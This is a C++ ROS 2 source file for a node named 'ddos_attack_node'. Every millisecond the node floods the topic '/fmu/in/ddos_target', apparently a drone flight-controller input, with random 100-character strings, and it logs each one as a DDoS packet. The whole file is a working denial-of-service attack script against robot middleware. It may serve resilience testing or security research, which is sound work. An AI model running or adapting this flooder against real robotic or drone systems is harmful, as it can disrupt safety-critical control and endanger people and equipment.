#include <chrono>
#include <memory>
#include "rclcpp/rclcpp.hpp"
#include "std_msgs/msg/string.hpp"
#include <random>

using namespace std::chrono_literals;

class DdosAttackNode : public rclcpp::Node
{
public:
    DdosAttackNode()
    : Node("ddos_attack_node")
    {
        publisher_ = this->create_publisher<std_msgs::msg::String>("/fmu/in/ddos_target", 10);
        timer_ = this->create_wall_timer(1ms, std::bind(&DdosAttackNode::send_ddos_packets, this));
    }

private:
    void send_ddos_packets()
    {
        std_msgs::msg::String msg;
        msg.data = generate_random_data();
        publisher_->publish(msg);
        RCLCPP_INFO(this->get_logger(), "Sending DDoS packet: %s", msg.data.c_str());
    }

    std::string generate_random_data()
    {
        std::string data;
        static std::default_random_engine generator;
        static std::uniform_int_distribution<int> distribution(97, 122); // ASCII range for lowercase letters
        for (int i = 0; i < 100; ++i) {
            data += static_cast<char>(distribution(generator));
        }
        return data;
    }

    rclcpp::Publisher<std_msgs::msg::String>::SharedPtr publisher_;
    rclcpp::TimerBase::SharedPtr timer_;
};

int main(int argc, char * argv[])
{
    rclcpp::init(argc, argv);
    rclcpp::spin(std::make_shared<DdosAttackNode>());
    rclcpp::shutdown();
    return 0;
}

